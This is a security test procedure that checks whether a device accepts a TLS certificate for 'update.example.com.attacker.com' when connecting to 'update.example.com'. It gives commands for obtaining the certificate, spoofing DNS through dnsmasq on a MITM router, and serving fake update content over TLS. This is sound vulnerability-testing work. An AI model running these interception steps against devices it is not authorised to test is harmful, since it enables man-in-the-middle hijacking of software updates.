# Certificate Hostname Substring Matching Vulnerability Test

## Overview

This test checks if a device performs substring matching on certificate hostnames instead of exact matching. If vulnerable, the device would accept a certificate for `update.example.com.attacker.com` when connecting to `update.example.com`.

## Attack Flow

```
Device                      MITM Router
   |                            |
   |-- DNS: update.example.com ->|
   |<- 192.168.200.1 (spoofed) -|
   |                            |
   |-- TLS connect :443 ------->|
   |                            |
   |<- Cert: update.example.com.attacker.com
   |                            |
   If device accepts = VULNERABLE (substring matching)
   If device rejects = SECURE (exact hostname matching)
```

## Prerequisites

- Control of a domain (e.g., `attacker.com`)
- MITM router setup working
- certbot installed (`sudo pacman -S certbot`)

---

## Step 1: Create DNS Record for Your Domain

Add an A record in your DNS provider:

```
update.example.com.attacker.com  A  <your-public-IP>
```

Wait for propagation and verify:
```bash
dig update.example.com.attacker.com
```

---

## Step 2: Get Let's Encrypt Certificate

### Option A: HTTP Challenge (port 80 must be open to internet)

```bash
sudo certbot certonly --standalone -d update.example.com.attacker.com
```

### Option B: DNS Challenge (no open ports needed)

```bash
sudo certbot certonly --manual --preferred-challenges dns -d update.example.com.attacker.com
```

When prompted, create a TXT record in your DNS:
```
_acme-challenge.update.example.com  TXT  "<value-certbot-gives-you>"
```

### Certificate Location

After success, certificates are saved to:
```
/etc/letsencrypt/live/update.example.com.attacker.com/fullchain.pem
/etc/letsencrypt/live/update.example.com.attacker.com/privkey.pem
```

---

## Step 3: Start MITM Router

```bash
sudo ./mitm.sh up -m none
```

---

## Step 4: Verify DNS Spoofing

Ensure `dns-spoof.conf` contains:
```
address=/update.example.com/192.168.200.1
```

If modified, reload dnsmasq:
```bash
sudo killall dnsmasq
sudo dnsmasq -C tmp_dnsmasq.conf
```

Verify from a client on the network:
```bash
dig update.example.com @192.168.200.1
# Should return 192.168.200.1
```

---

## Step 5: Run Server with Let's Encrypt Cert

```bash
sudo python3 -m http.server \
  --ssl-cert /etc/letsencrypt/live/update.example.com.attacker.com/fullchain.pem \
  --ssl-key /etc/letsencrypt/live/update.example.com.attacker.com/privkey.pem \
  443
```

Or with a custom server script:
```bash
sudo python3 ./fake-server.py \
  --cert /etc/letsencrypt/live/update.example.com.attacker.com/fullchain.pem \
  --key /etc/letsencrypt/live/update.example.com.attacker.com/privkey.pem
```

---

## Step 6: Trigger Update

From the target device, trigger an update check or connection to `update.example.com`.

---

## Expected Results

### Vulnerable (substring matching)

- Device accepts the certificate
- Content downloads successfully
- Server logs show successful GET request
- **Security issue:** Device does not properly validate certificate hostname

### Secure (exact hostname matching)

- Device rejects the connection
- Error similar to: "certificate is valid for update.example.com.attacker.com, not update.example.com"
- **Device is secure** against this attack vector

---

## Cleanup

```bash
sudo ./mitm.sh down
```

To revoke/delete the Let's Encrypt cert (optional):
```bash
sudo certbot delete --cert-name update.example.com.attacker.com
```
